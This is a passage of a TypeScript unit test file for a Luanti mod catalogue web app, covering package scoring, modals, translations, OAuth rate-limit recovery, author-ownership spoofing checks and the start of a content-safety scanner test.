    });

    // 1. normalizePackage with ContentDB composite score (1564.3) and 0 reviews must NOT fall back to stale cachedMeta.score = 5
    const normalized = (pkgService as any).normalizePackage({
      id: 'Jeija/mesecons',
      author: 'Jeija',
      name: 'mesecons',
      title: 'Mesecons',
      type: 'mod',
      score: 0,
      contentdb_score: 1564.3,
      reviews: { positive: 0, neutral: 0, negative: 0 },
      downloads: 264100
    });
    expect(normalized.score).toBe(0);
    expect(normalized.contentdb_score).toBe(1564.3);
    expect((pkgService as any).hydratedMetaCache.get(cacheKey)?.score).toBe(0);

    // 2. When a package currently has score: 5 in memory and hydratedMetaCache, removing the last review (empty list) must reset score to 0 everywhere
    const activeMesecons = { ...normalized, score: 5 };
    (pkgService as any).hydratedMetaCache.set(cacheKey, { license: 'LGPL-3.0-ONLY', score: 5 });
    (pkgService as any)._packages.set([activeMesecons]);
    (pkgService as any)._activePackage.set(activeMesecons);
    (pkgService as any)._serverTop10Today.set([activeMesecons]);
    (pkgService as any)._serverTop10Week.set([activeMesecons]);

    pkgService.applyReviewAverageToPackage(activeMesecons, []);

    expect(pkgService.packages()[0].score).toBe(0);
    expect(pkgService.activePackage()?.score).toBe(0);
    expect(pkgService.top10TodayPackages()[0].score).toBe(0);
    expect(pkgService.top10WeekPackages()[0].score).toBe(0);
    expect((pkgService as any).hydratedMetaCache.get(cacheKey)?.score).toBe(0);
  });

  it('should copy a clean package share URL without concatenating short_desc and open the package modal on direct /package/:author/:name navigation', async () => {
    const pwaService = TestBed.inject(PwaService);
    const pkgService = TestBed.inject(PackageService);

    const writeTextSpy = vi.fn().mockResolvedValue(undefined);
    const shareSpy = vi.fn().mockResolvedValue(undefined);
    const origClipboard = navigator.clipboard;
    const origShare = (navigator as any).share;

    Object.defineProperty(navigator, 'clipboard', {
      value: { writeText: writeTextSpy },
      configurable: true
    });
    Object.defineProperty(navigator, 'share', {
      value: shareSpy,
      configurable: true
    });

    try {
      const targetUrl = 'https://luantihub.org/package/mt-mods/i3';
      await pwaService.sharePackage('i3', 'A Next Generation Inventory', targetUrl);

      // Must copy only the clean URL to clipboard and omit `text` from navigator.share so OS share sheets never concatenate url + text
      expect(writeTextSpy).toHaveBeenCalledWith(targetUrl);
      expect(shareSpy).toHaveBeenCalledWith({
        title: 'i3',
        url: targetUrl
      });
      expect(shareSpy.mock.calls[0][0].text).toBeUndefined();
    } finally {
      Object.defineProperty(navigator, 'clipboard', {
        value: origClipboard,
        configurable: true
      });
      Object.defineProperty(navigator, 'share', {
        value: origShare,
        configurable: true
      });
    }

    // Simulate deep-link navigation to /package/Luanti/minetest_game with edge-injected __LUANTI_INITIAL_PACKAGE__
    (window as any).__LUANTI_INITIAL_PACKAGE__ = { author: 'Luanti', name: 'minetest_game' };
    (pkgService as any).initialUrlSynced = false;
    (pkgService as any)._packages.set([]);
    (pkgService as any)._activePackage.set(null);
    (pkgService as any).syncStateFromUrl('/package/Luanti/minetest_game');
    expect((window as any).__LUANTI_INITIAL_PACKAGE__).toBeUndefined();
    expect((pkgService as any).pendingRoutePackage).toEqual({ author: 'Luanti', name: 'minetest_game' });
    // Modal opens immediately at 0ms with initial package state while catalog/details load
    expect(pkgService.activePackage()?.name).toBe('minetest_game');
    expect(pkgService.activePackage()?.type).toBe('game');

    // Once boot payload arrives (even if upstream author is 'Minetest' or 'Luanti'), the full package merges into the open modal
    (pkgService as any).applyBootPayload({
      packages: [
        {
          id: 'Minetest/minetest_game',
          author: 'Minetest',
          name: 'minetest_game',
          title: 'Minetest Game',
          type: 'game',
          short_desc: 'The classic default game',
          downloads: 950000
        },
        {
          id: 'mt-mods/i3',
          author: 'mt-mods',
          name: 'i3',
          title: 'i3',
          type: 'mod',
          short_desc: 'A Next Generation Inventory',
          downloads: 45000
        }
      ]
    });
    expect(pkgService.activePackage()?.name).toBe('minetest_game');
    expect(pkgService.activePackage()?.title).toBe('Minetest Game');
    expect(pkgService.activePackage()?.downloads).toBe(950000);

    // 1st click on Close button / backdrop must immediately close the modal and NOT reopen when Router navigates to '/'
    pkgService.closePackageModal(true);
    (pkgService as any).syncStateFromUrl('/');
    expect(pkgService.activePackage()).toBeNull();

    // Also resolve previously broken links that had short_desc concatenated onto the package name
    (pkgService as any)._activePackage.set(null);
    await pkgService.openPackageModalById('mt-mods', 'i3A Next Generation Inventory', false);
    expect(pkgService.activePackage()?.id).toBe('mt-mods/i3');
  });

  it('should layer Escape key dismissal in PackageDetailModalComponent (Lightbox -> Report -> Tag Editor -> Modal) and navigate Lightbox via window Arrow keys', () => {
    const pkgService = TestBed.inject(PackageService);
    const appFixture = TestBed.createComponent(App);
    const appComp = appFixture.componentInstance;
    const modalFixture = TestBed.createComponent(PackageDetailModalComponent);
    const modalComp = modalFixture.componentInstance;

    const pkg = (pkgService as any).normalizePackage({
      id: 'mt-mods/i3',
      author: 'mt-mods',
      name: 'i3',
      title: 'i3',
      type: 'mod',
      screenshots: [
        'https://content.luanti.org/shot-1.png',
        'https://content.luanti.org/shot-2.png'
      ]
    });

    (pkgService as any)._activePackage.set(pkg);
    modalComp.package = pkg;
    modalFixture.detectChanges();

    // Open Lightbox, Report form, and Tag Editor
    modalComp.openLightbox('https://content.luanti.org/shot-1.png');
    modalComp.isReportOpen.set(true);
    modalComp.isEditingTags.set(true);

    // Window-level ArrowRight advances Lightbox image immediately without requiring manual focus
    modalComp.handleWindowKeyDown(new KeyboardEvent('keydown', { key: 'ArrowRight' }));
    expect(modalComp.lightboxImageUrl()).toBe('https://content.luanti.org/shot-2.png');

    // 1st Escape: closes Lightbox only, keeping Package Detail Modal open
    appComp.handleKeyDown(new KeyboardEvent('keydown', { key: 'Escape' }));
    expect(modalComp.lightboxImageUrl()).toBeNull();
    expect(modalComp.isReportOpen()).toBe(true);
    expect(pkgService.activePackage()?.id).toBe('mt-mods/i3');

    // 2nd Escape: closes inline Report form, keeping Package Detail Modal open
    appComp.handleKeyDown(new KeyboardEvent('keydown', { key: 'Escape' }));
    expect(modalComp.isReportOpen()).toBe(false);
    expect(modalComp.isEditingTags()).toBe(true);
    expect(pkgService.activePackage()?.id).toBe('mt-mods/i3');

    // 3rd Escape: closes inline Tag Editor, keeping Package Detail Modal open
    appComp.handleKeyDown(new KeyboardEvent('keydown', { key: 'Escape' }));
    expect(modalComp.isEditingTags()).toBe(false);
    expect(pkgService.activePackage()?.id).toBe('mt-mods/i3');

    // 4th Escape: closes the Package Detail Modal itself
    appComp.handleKeyDown(new KeyboardEvent('keydown', { key: 'Escape' }));
    expect(pkgService.activePackage()).toBeNull();
  });

  it('should restore the previous Package Detail Modal after closing the Setup Guide and sort by Recently Updated', () => {
    const pkgService = TestBed.inject(PackageService);
    const oldPkg = (pkgService as any).normalizePackage({
      id: 'author/older_mod',
      author: 'author',
      name: 'older_mod',
      title: 'Older Mod',
      type: 'mod',
      downloads: 5000,
      updated_at: '2025-01-10T00:00:00Z'
    });
    const recentPkg = (pkgService as any).normalizePackage({
      id: 'author/recent_mod',
      author: 'author',
      name: 'recent_mod',
      title: 'Recent Mod',
      type: 'mod',
      downloads: 100,
      updated_at: '2026-10-28T00:00:00Z'
    });

    (pkgService as any)._packages.set([oldPkg, recentPkg]);
    pkgService.setSortBy('updated', false);
    expect(pkgService.filteredPackages().map(p => p.name)).toEqual(['recent_mod', 'older_mod']);

    // Open Setup Modal from Recent Mod and verify closing Setup Modal restores Recent Mod
    pkgService.openPackageModal(recentPkg, false);
    expect(pkgService.activePackage()?.name).toBe('recent_mod');

    pkgService.closePackageModal(false);
    pkgService.openSetupModal(false, recentPkg);
    expect(pkgService.isSetupModalOpen()).toBe(true);

    pkgService.closeSetupModal(false);
    expect(pkgService.isSetupModalOpen()).toBe(false);
    expect(pkgService.activePackage()?.name).toBe('recent_mod');
  });

  it('should translate clearCacheConfirm in the mobile hamburger menu and keep ContentDB packages out of decentralizedGitPackages after sessionStorage boot cache re-normalization', () => {
    const pkgService = TestBed.inject(PackageService);
    const translationService = TestBed.inject(TranslationService);

    for (const locale of ['en', 'sk', 'de', 'fr', 'es', 'ru'] as const) {
      translationService.setLocale(locale);
      const headerConfirm = translationService.translate('header.clearCacheConfirm');
      const pwaConfirm = translationService.translate('pwa.clearCacheConfirm');
      const reportSubmitted = translationService.translate('modal.reportSubmitted');
      expect(headerConfirm).not.toBe('header.clearCacheConfirm');
      expect(pwaConfirm).not.toBe('pwa.clearCacheConfirm');
      expect(reportSubmitted).not.toBe('modal.reportSubmitted');
    }
    translationService.setLocale('en');

    const headerFixture = TestBed.createComponent(HeaderComponent);
    const headerComp = headerFixture.componentInstance;
    headerComp.isMobileMenuOpen.set(true);
    headerFixture.detectChanges();

    headerComp.onClearCache(new MouseEvent('click'));
    headerFixture.detectChanges();
    expect(headerComp.confirmingClearCache()).toBe(true);
    expect(headerFixture.nativeElement.textContent).toContain('Clear all cached files, service workers, and reload LuantiHub?');
    expect(headerFixture.nativeElement.textContent).not.toContain('pwa.clearCacheConfirm');

    // Simulate initial boot payload with official ContentDB packages (no provider or provider='contentdb') + 1 genuine Git Community submission
    const initialBootPayload = {
      packages: [
        {
          id: 'Minetest/minetest_game',
          author: 'Minetest',
          name: 'minetest_game',
          title: 'Minetest Game',
          type: 'game',
          source: 'official',
          sources: ['official'],
          downloads: 950000
        },
        {
          id: 'mt-mods/i3',
          author: 'mt-mods',
          name: 'i3',
          title: 'i3',
          type: 'mod',
          repo: 'https://github.com/mt-mods/i3',
          source: 'official',
          sources: ['official'],
          downloads: 45000
        },
        {
          id: 'other-author/x_custom',
          author: 'other-author',
          name: 'x_custom',
          title: 'Completely Different Mod',
          type: 'mod',
          source: 'official',
          sources: ['official'],
          downloads: 12000
        },
        {
          id: 'sakel-hub/x_custom',
          author: 'sakel-hub',
          name: 'x_custom',
          title: 'Sakel Custom Git Mod',
          type: 'mod',
          provider: 'codeberg',
          repo_url: 'https://codeberg.org/sakel-hub/x_custom',
          source: 'git',
          sources: ['git'],
          downloads: 300
        }
      ]
    };

    (pkgService as any).applyBootPayload(initialBootPayload);
    expect(pkgService.decentralizedGitPackages().map(p => p.id)).toEqual(['sakel-hub/x_custom']);

    // Simulate mobile browsing session where `this._packages()` is persisted to sessionStorage (`lh_boot_cache_v6`) and re-applied on reload/return
    const persistedPackages = JSON.parse(JSON.stringify(pkgService.packages()));
    (pkgService as any).applyBootPayload({ packages: persistedPackages });

    // ContentDB packages must NEVER flip to 'git' or leak into decentralizedGitPackages()
    expect(pkgService.decentralizedGitPackages().map(p => p.id)).toEqual(['sakel-hub/x_custom']);
    const mtg = pkgService.packages().find(p => p.id === 'Minetest/minetest_game');
    expect(mtg?.source).toBe('official');
    expect(mtg?.sources).toEqual(['official']);
    expect(mtg?.provider).toBe('contentdb');
  });

  it('should open the Public Author Profile Drawer with Creator Bio, Verified Identities, aggregated stats, and 8-per-page pagination, preserving modal/drawer navigation context', async () => {
    const pkgService = TestBed.inject(PackageService);
    const authService = TestBed.inject(AuthService);
    const translationService = TestBed.inject(TranslationService);

    for (const locale of ['en', 'sk', 'de', 'fr', 'es', 'ru'] as const) {
      translationService.setLocale(locale);
      expect(translationService.translate('author.viewProfile')).not.toBe('author.viewProfile');
      expect(translationService.translate('author.aboutCreator')).not.toBe('author.aboutCreator');
      expect(translationService.translate('author.totalPackages')).not.toBe('author.totalPackages');
    }
    translationService.setLocale('en');

    // Seed 10 packages by 'SaKeL' (and 'sakel-hub') to test 8-per-page pagination + stats
    const mockPackages = Array.from({ length: 10 }, (_, idx) =>
      (pkgService as any).normalizePackage({
        id: `${idx === 0 ? 'sakel-hub' : 'SaKeL'}/x_mod_${idx + 1}`,
        author: idx === 0 ? 'sakel-hub' : 'SaKeL',
        name: `x_mod_${idx + 1}`,
        title: `X Mod ${idx + 1}`,
        type: idx === 0 ? 'game' : 'mod',
        source: idx === 0 ? 'git' : 'official',
        sources: idx === 0 ? ['git'] : ['official'],
        provider: idx === 0 ? 'codeberg' : 'contentdb',
        downloads: (10 - idx) * 1000,
        contentdb_downloads: idx === 0 ? 0 : (10 - idx) * 900,
        luantihub_downloads: (10 - idx) * 100,
        score: 4.8,
        tags: ['survival', 'building', idx % 2 === 0 ? 'mapgen' : 'combat'],
        donate_url: idx === 0 ? 'https://ko-fi.com/sakel' : undefined
      })
    );
    (pkgService as any)._packages.set(mockPackages);

    (authService as any)._currentUser.set({
      id: 'u-sakel',
      username: 'SaKeL',
      display_name: 'Juraj (SaKeL)',
      avatar_url: 'https://github.com/SaKeL.png',
      bio: 'Creator of X-Farming, X-Bows, and voxel survival mods for Luanti.',
      identities: [
        { provider: 'codeberg', username: 'sakel-hub', verified: true },
        { provider: 'contentdb', username: 'SaKeL', verified: true }
      ]
    });

    // Open Package Detail Modal for x_mod_1, then click View Author Profile
    pkgService.openPackageModal(mockPackages[0], false);
    expect(pkgService.activePackage()?.name).toBe('x_mod_1');

    await pkgService.openAuthorDrawer('SaKeL', false, mockPackages[0]);
    expect(pkgService.activePackage()).toBeNull();
    expect(pkgService.activeAuthorUsername()).toBe('SaKeL');
    expect(pkgService.activeAuthorProfile()?.bio).toBe('Creator of X-Farming, X-Bows, and voxel survival mods for Luanti.');

    const drawerFixture = TestBed.createComponent(AuthorDrawerComponent);
    const drawerComp = drawerFixture.componentInstance;
    drawerFixture.detectChanges();

    expect(drawerComp.authorPackages().length).toBe(10);
    expect(drawerComp.totalDownloads()).toBe(55000);
    expect(drawerComp.averageRating()).toBe(4.8);
    expect(drawerComp.totalPages()).toBe(2);
    expect(drawerComp.pagedAuthorPackages().length).toBe(8);
    expect(drawerFixture.nativeElement.textContent).toContain('Creator of X-Farming, X-Bows, and voxel survival mods for Luanti.');

    // Advance to page 2 -> shows remaining 2 packages
    drawerComp.setPage(2);
    drawerFixture.detectChanges();
    expect(drawerComp.currentPage()).toBe(2);
    expect(drawerComp.pagedAuthorPackages().length).toBe(2);

    // Filter by 'game' category inside the Author Drawer
    drawerComp.selectCategory('game');
    drawerFixture.detectChanges();
    expect(drawerComp.filteredAuthorPackages().length).toBe(1);
    expect(drawerComp.currentPage()).toBe(1);

    // Clicking a package inside AuthorDrawerComponent opens that package modal, and closing that package modal returns to the Author Drawer
    drawerComp.openPackage(mockPackages[1]);
    expect(pkgService.activeAuthorUsername()).toBeNull();
    expect(pkgService.activePackage()?.name).toBe('x_mod_2');

    pkgService.closePackageModal(false);
    expect(pkgService.activePackage()).toBeNull();
    expect(pkgService.activeAuthorUsername()).toBe('SaKeL');

    // Closing AuthorDrawerComponent when opened from x_mod_1 restores x_mod_1
    await pkgService.openAuthorDrawer('SaKeL', false, mockPackages[0]);
    pkgService.closeAuthorDrawer(false);
    expect(pkgService.activeAuthorUsername()).toBeNull();
    expect(pkgService.activePackage()?.name).toBe('x_mod_1');

    // Clicking "Search in Catalog" inside AuthorDrawerComponent when opened from x_mod_1 closes BOTH the Author Drawer and the Package Detail Modal
    await pkgService.openAuthorDrawer('SaKeL', false, mockPackages[0]);
    drawerComp.filterCatalogByAuthor();
    expect(pkgService.activeAuthorUsername()).toBeNull();
    expect(pkgService.activePackage()).toBeNull();
    expect(pkgService.searchQuery()).toBe('SaKeL');
  });

  it('should pre-warm hover video origins/preload, reveal embed curtain on postMessage playback, and enlarge into Cinema Video Theater at current timestamp', async () => {
    const pkgService = TestBed.inject(PackageService);
    const translationService = TestBed.inject(TranslationService);

    for (const locale of ['en', 'sk', 'de', 'fr', 'es', 'ru'] as const) {
      translationService.setLocale(locale);
      expect(translationService.translate('card.enlargeVideo')).not.toBe('card.enlargeVideo');
      expect(translationService.translate('card.viewPackageDetails')).not.toBe('card.viewPackageDetails');
    }
    translationService.setLocale('en');

    // Verify startSeconds support across YouTube, Vimeo, and PeerTube
    const ytStart = pkgService.buildVideoEmbedUrl('https://www.youtube.com/watch?v=dQw4w9WgXcQ', {
      autoplay: true,
      mute: false,
      minimalControls: false,
      startSeconds: 14.8
    });
    expect(ytStart).toContain('&start=14');

    const vimeoStart = pkgService.buildVideoEmbedUrl('https://vimeo.com/123456789', {
      autoplay: true,
      mute: false,
      minimalControls: false,
      startSeconds: 22
    });
    expect(vimeoStart).toContain('#t=22s');

    const peertubeStart = pkgService.buildVideoEmbedUrl('https://diode.zone/videos/watch/abc-123', {
      autoplay: true,
      mute: false,
      minimalControls: false,
      startSeconds: 9
    });
    expect(peertubeStart).toContain('&start=9s');

    // Verify warmUpVideoPreview deduplicates preconnect and direct video preload links
    pkgService.warmUpVideoPreview('https://cdn.example.org/demo/trailer.mp4', 'https://cdn.example.org/demo/poster.jpg', true);
    pkgService.warmUpVideoPreview('https://cdn.example.org/demo/trailer.mp4', 'https://cdn.example.org/demo/poster.jpg', true);
    const preconnectLinks = document.head.querySelectorAll('link[rel="preconnect"][href="https://cdn.example.org"]');
    const preloadLinks = document.head.querySelectorAll('link[rel="preload"][as="video"][href="https://cdn.example.org/demo/trailer.mp4"]');
    expect(preconnectLinks.length).toBe(1);
    expect(preloadLinks.length).toBe(1);

    // Mock desktop hover media query
    const origMatchMedia = window.matchMedia;
    (window as any).matchMedia = (q: string) => ({
      matches: q.includes('hover: hover'),
      media: q,
      onchange: null,
      addListener: () => {},
      removeListener: () => {},
      addEventListener: () => {},
      removeEventListener: () => {},
      dispatchEvent: () => false
    });

    try {
      const videoPkg = (pkgService as any).normalizePackage({
        id: 'SaKeL/voxel_cinema',
        author: 'SaKeL',
        name: 'voxel_cinema',
        title: 'Voxel Cinema Mod',
        type: 'mod',
        source: 'official',
        sources: ['official'],
        downloads: 5000,
        license: 'MIT',
        video_url: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
        video_thumbnail_url: 'https://i.ytimg.com/vi/dQw4w9WgXcQ/hqdefault.jpg'
      });

      const cardFixture = TestBed.createComponent(PackageCardComponent);
      const cardComp = cardFixture.componentInstance;
      cardComp.package = videoPkg;
      cardFixture.detectChanges();

      const vignetteEl = cardFixture.nativeElement.querySelector('[data-testid="card-thumbnail-vignette"]') as HTMLElement | null;
      expect(vignetteEl).not.toBeNull();
      expect(vignetteEl?.className).toContain('card-thumbnail-vignette');
      expect(vignetteEl?.className).not.toContain('from-5%');
      const maskClipEl = cardFixture.nativeElement.querySelector('.card-thumbnail-mask') as HTMLElement | null;
      expect(maskClipEl).not.toBeNull();
      expect(maskClipEl?.className).toContain('bottom-px');

      cardComp.onCardMouseEnter();
      await new Promise(resolve => setTimeout(resolve, 210));
      cardFixture.detectChanges();

      expect(cardComp.isHoverVideoActive()).toBe(true);
      expect(cardComp.isEmbedVideoReady()).toBe(false);
      // Vignette/shadow overlay is removed while hover video is playing to prevent bottom subpixel seam
      expect(cardFixture.nativeElement.querySelector('[data-testid="card-thumbnail-vignette"]')).toBeNull();

      // Untrusted/empty postMessage origins are ignored when hover video is active
      cardComp.onWindowMessage(
        new MessageEvent('message', {
          origin: 'https://evil.example',
          data: JSON.stringify({
            event: 'infoDelivery',
            info: { playerState: 1, currentTime: 99 }
          })
        })
      );
      expect(cardComp.isEmbedVideoReady()).toBe(false);

      // Simulate YouTube IFrame API infoDelivery postMessage from exact embed origin indicating playback at 14.7s
      cardComp.onWindowMessage(
        new MessageEvent('message', {
          origin: 'https://www.youtube-nocookie.com',
          data: JSON.stringify({
            event: 'infoDelivery',
            info: { playerState: 1, currentTime: 14.7 }
          })
        })
      );
      expect(cardComp.isEmbedVideoReady()).toBe(true);
      expect(cardComp.currentHoverSeconds).toBeCloseTo(14.7, 1);

      // Click Enlarge Video button -> stops card hover video & opens Cinema Video Theater at 14s
      cardComp.enlargeHoverVideo(new MouseEvent('click'));
      cardFixture.detectChanges();
      expect(cardComp.isHoverVideoActive()).toBe(false);
      // Vignette/shadow overlay is restored when hover video ends
      expect(cardFixture.nativeElement.querySelector('[data-testid="card-thumbnail-vignette"]')).not.toBeNull();
      expect(pkgService.activeVideoTheater()?.pkg.id).toBe('SaKeL/voxel_cinema');
      expect(pkgService.activeVideoTheater()?.startSeconds).toBe(14);

      // Transition from Video Theater to full Package Details Modal
      pkgService.openPackageFromVideoTheater();
      expect(pkgService.activeVideoTheater()).toBeNull();
      expect(pkgService.activePackage()?.id).toBe('SaKeL/voxel_cinema');
      pkgService.closePackageModal(false);
    } finally {
      window.matchMedia = origMatchMedia;
    }
  });

  it('should recover from GitHub OAuth HTTP 429 rate-limit when switching between two GitHub accounts', async () => {
    const { onRequestGet: oauthCallbackGet } = await import('../../functions/api/auth/[provider]/callback');
    const { createOAuthStateToken, verifySessionToken } = await import('../../functions/api/auth/lib/session');

    const secret = 'test-oauth-session-secret';
    const state = await createOAuthStateToken('github', secret);
    let tokenExchangeCalls = 0;
    const tokenContentTypes: string[] = [];

    const origFetch = globalThis.fetch;
    globalThis.fetch = (async (input: RequestInfo | URL, init?: RequestInit) => {
      const urlStr = typeof input === 'string' ? input : input instanceof URL ? input.toString() : input.url;
      if (urlStr === 'https://github.com/login/oauth/access_token') {
        tokenExchangeCalls++;
        const headers = new Headers(init?.headers || {});
        tokenContentTypes.push(headers.get('Content-Type') || '');
        if (tokenExchangeCalls === 1) {
          return new Response('Too Many Requests', {
            status: 429,
            headers: { 'Retry-After': '1' }
          });
        }
        return new Response(JSON.stringify({ access_token: 'gho_account2_token' }), {
          status: 200,
          headers: { 'Content-Type': 'application/json' }
        });
      }
      if (urlStr === 'https://api.github.com/user') {
        return new Response(
          JSON.stringify({
            id: 998877,
            login: 'SecondGitHubUser',
            name: 'Second GitHub User',
            avatar_url: 'https://github.com/SecondGitHubUser.png',
            html_url: 'https://github.com/SecondGitHubUser'
          }),
          {
            status: 200,
            headers: { 'Content-Type': 'application/json' }
          }
        );
      }
      return new Response('{}', { status: 200 });
    }) as typeof fetch;

    try {
      const callbackUrl = `https://luantihub.org/api/auth/github/callback?code=gh_switch_code_429&state=${encodeURIComponent(state)}`;
      const req = new Request(callbackUrl, {
        headers: {
          Cookie: `lh_oauth_state=${state}`
        }
      });

      const res = await oauthCallbackGet({
        params: { provider: 'github' },
        request: req,
        env: {
          GITHUB_CLIENT_ID: 'gh_client_id',
          GITHUB_CLIENT_SECRET: 'gh_client_secret',
          SESSION_SECRET: secret
        }
      });

      expect(res.status).toBe(302);
      expect(res.headers.get('Location')).toBe('https://luantihub.org/?auth_success=1');
      expect(tokenExchangeCalls).toBe(2);
      // Both attempts must preserve application/x-www-form-urlencoded rather than switching to JSON on 429
      expect(tokenContentTypes).toEqual([
        'application/x-www-form-urlencoded',
        'application/x-www-form-urlencoded'
      ]);

      const setCookie = res.headers.get('Set-Cookie') || '';
      const sessionMatch = setCookie.match(/lh_session=([^;]+)/);
      expect(sessionMatch).toBeTruthy();
      const verifiedUserId = await verifySessionToken(sessionMatch![1], secret);
      expect(verifiedUserId).toBe('usr_github_SecondGitHubUser');

      // Duplicate callback request with the same code should hit the cache without calling GitHub again
      const duplicateRes = await oauthCallbackGet({
        params: { provider: 'github' },
        request: req,
        env: {
          GITHUB_CLIENT_ID: 'gh_client_id',
          GITHUB_CLIENT_SECRET: 'gh_client_secret',
          SESSION_SECRET: secret
        }
      });
      expect(duplicateRes.status).toBe(302);
      expect(duplicateRes.headers.get('Location')).toBe('https://luantihub.org/?auth_success=1');
      expect(tokenExchangeCalls).toBe(2);
    } finally {
      globalThis.fetch = origFetch;
    }
  });

  it('should enforce strict cryptographic forge-provider ownership before allowing an author to delist or remove a package', async () => {
    const { verifyStrictPackageAuthorOwnership } = await import('../../functions/api/auth/lib/session');
    const authService = TestBed.inject(AuthService);

    const targetGithubPkg = {
      id: 'SaKeL/voxel_garden',
      author: 'SaKeL',
      author_name: 'SaKeL',
      author_id: 'usr_sakel_gh',
      name: 'voxel_garden',
      title: 'Voxel Garden',
      type: 'mod' as const,
      short_desc: 'Garden mod',
      thumbnail: 'logo.svg',
      banner: 'logo.svg',
      score: 5,
      downloads: 100,
      license: 'MIT',
      provider: 'github' as const,
      repo_url: 'https://github.com/SaKeL/voxel_garden',
      source: 'git' as const
    };

    // 1. Unverified handle spoof (e.g. Direct Sign-In without OAuth or PAT) -> REJECTED
    expect(
      verifyStrictPackageAuthorOwnership(
        { id: 'usr_attacker_1', username: 'SaKeL' },
        [{ provider: 'github', username: 'SaKeL', verified: 0 }],
        targetGithubPkg,
        'SaKeL'
      )
    ).toBe(false);

    (authService as any)._currentUser.set({
      id: 'usr_attacker_1',
      username: 'SaKeL',
      role: 'user',
      is_admin: false,
      identities: [{ provider: 'github', username: 'SaKeL', profile_url: '', verified: false }]
    });
    expect(authService.canManagePackage(targetGithubPkg)).toBe(false);

    // 2. Cross-forge username spoof (attacker verified 'SaKeL' on GitLab, trying to remove SaKeL's GitHub package) -> REJECTED
    expect(
      verifyStrictPackageAuthorOwnership(
        { id: 'usr_attacker_2', username: 'SaKeL' },
        [{ provider: 'gitlab', username: 'SaKeL', verified: 1 }],
        targetGithubPkg,
        'SaKeL'
      )
    ).toBe(false);

    (authService as any)._currentUser.set({
      id: 'usr_attacker_2',
      username: 'SaKeL',
      role: 'user',
      is_admin: false,
      identities: [{ provider: 'gitlab', username: 'SaKeL', profile_url: '', verified: true }]
    });
    expect(authService.canManagePackage(targetGithubPkg)).toBe(false);

    // 3. True verified author on the exact hosting forge (GitHub 'SaKeL') -> ALLOWED
    expect(
      verifyStrictPackageAuthorOwnership(
        { id: 'usr_sakel_gh', username: 'SaKeL' },
        [{ provider: 'github', username: 'SaKeL', verified: 1 }],
        targetGithubPkg,
        'SaKeL'
      )
    ).toBe(true);

    (authService as any)._currentUser.set({
      id: 'usr_sakel_gh',
      username: 'SaKeL',
      role: 'user',
      is_admin: false,
      identities: [{ provider: 'github', username: 'SaKeL', profile_url: '', verified: true }]
    });
    expect(authService.canManagePackage(targetGithubPkg)).toBe(true);
  });

  it('should render reusable FrostedPreloaderComponent variants, replace Sign In button with frosted preloader pill while authenticating, and prevent duplicate login modal opens', async () => {
    const { FrostedPreloaderComponent } = await import('./shared/components/frosted-preloader.component');
    const authService = TestBed.inject(AuthService);

    // 1. Test FrostedPreloaderComponent across variants
    const preloaderFixture = TestBed.createComponent(FrostedPreloaderComponent);
    preloaderFixture.componentInstance.variant = 'overlay';
    preloaderFixture.componentInstance.size = 'lg';
    preloaderFixture.componentInstance.label = 'Signing in...';
    preloaderFixture.componentInstance.sublabel = 'Verifying your session...';
    preloaderFixture.detectChanges();
    const preloaderEl = preloaderFixture.nativeElement as HTMLElement;
    expect(preloaderEl.querySelector('.glass-preloader-card')).toBeTruthy();
    expect(preloaderEl.querySelector('.luanti-orbital-ring')).toBeTruthy();
    expect(preloaderEl.textContent).toContain('Signing in...');

    // 2. Test HeaderComponent replaces Sign In button with FrostedPreloader pill while completing OAuth
    (authService as any)._currentUser.set(null);
    (authService as any)._isAuthModalOpen.set(false);
    (authService as any)._isCompletingOAuth.set(true);
    expect(authService.isBusyAuthenticating()).toBe(true);

    // Calling openAuthModal while busy authenticating must be a no-op
    authService.openAuthModal();
    expect(authService.isAuthModalOpen()).toBe(false);

    const headerFixture = TestBed.createComponent(HeaderComponent);
    headerFixture.detectChanges();
    const headerEl = headerFixture.nativeElement as HTMLElement;
    expect(headerEl.querySelector('app-frosted-preloader')).toBeTruthy();

    // Once authentication completes, Sign In or User Avatar renders normally
    (authService as any)._isCompletingOAuth.set(false);
    headerFixture.detectChanges();
  });

  it('should render PackageCardComponent author badge footer without clipping the bottom border', () => {
    const cardFixture = TestBed.createComponent(PackageCardComponent);
    cardFixture.componentInstance.package = {
      id: 'RealBadAngel/technic',
      author: 'RealBadAngel',
      name: 'technic',
      title: 'Technic',
      type: 'mod',
      short_desc: 'Extensive machinery mod with electricity and ores.',
      thumbnail: 'logo.svg',
      banner: 'logo.svg',
      score: 4.8,
      downloads: 165300,
      license: 'LGPL-2.1-ONLY',
      min_minetest_version: '5.0.0',
      tags: ['mapgen', 'technology', 'tools'],
      source: 'official'
    };
    cardFixture.detectChanges();

    const cardEl = cardFixture.nativeElement as HTMLElement;
    const outerCard = cardEl.querySelector('[role="button"]') as HTMLElement;
    expect(outerCard.className).toContain('min-h-[352px]');
    expect(outerCard.className).not.toContain('max-h-[364px]');

    const footerRow = cardEl.querySelector('.mt-auto.pt-2') as HTMLElement;
    expect(footerRow).toBeTruthy();
    expect(footerRow.className).toContain('min-h-[28px]');
    expect(footerRow.className).not.toContain('overflow-hidden');
  });

  it('should prevent false positives on legitimate Luanti mods while catching severe violations, auto-tagging warnings, and optimizing Workers AI checks with quota fallback', async () => {
    const {
      evaluateRepositoryContentSafetyStatic,
      evaluateRepositoryContentSafety
    } = await import('../../functions/api/lib/content-safety');

    // 1. Legitimate Luanti RPG / Farming / Mining mod should have ZERO false positives
    const benignModResult = evaluateRepositoryContentSafetyStatic({
      repoOwner: 'RealBadAngel',
      repoName: 'farming_and_dungeons',
      confFileName: 'mod.conf',
      rawConfig: 'name = farming_and_dungeons\ntitle = Blood Moon Dungeons & Farming\ndescription = Adds default:hoe_steel, farming:weed, flower_pot, strip_mining, bloodstone, bloodwood, and assassin cockpit quests.',
      title: 'Blood Moon Dungeons & Farming',
      shortDesc: 'Adds default:hoe_steel, farming:weed, flower_pot, strip_mining, bloodstone, bloodwood, and assassin cockpit quests.',
      readmeMarkdown: '# Blood Moon Dungeons\nFight zombie and skeleton bosses with sword and gun in PvP arenas! Uses minetest.register_on_dieplayer and damage_groups = {fleshy = 10}.',
      luaSource: `
        minetest.register_on_dieplayer(function(player)
          minetest.chat_send_all(player:get_player_name() .. " was killed by a zombie!")
        end)
        minetest.register_tool("farming:hoe_diamond", {
          description = "Diamond Hoe",
          damage_groups = { fleshy = 4 }
        })
      `,
      rootFileNames: ['mod.conf', 'README.md', 'init.lua', 'blood_moon_sky.png', 'assassin_armor.png']
    });
